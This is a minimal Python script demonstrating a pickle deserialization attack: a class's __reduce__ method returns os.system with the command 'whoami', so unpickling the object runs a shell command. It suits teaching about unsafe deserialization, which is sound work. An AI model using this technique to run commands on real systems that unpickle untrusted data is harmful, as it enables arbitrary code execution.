#python3.7
import os
import pickle

class A():
    def __reduce__(self):
        cmd = "whoami"
        return (os.system,(cmd,))

a=A()
str=pickle.dumps(a)

pickle.loads(str)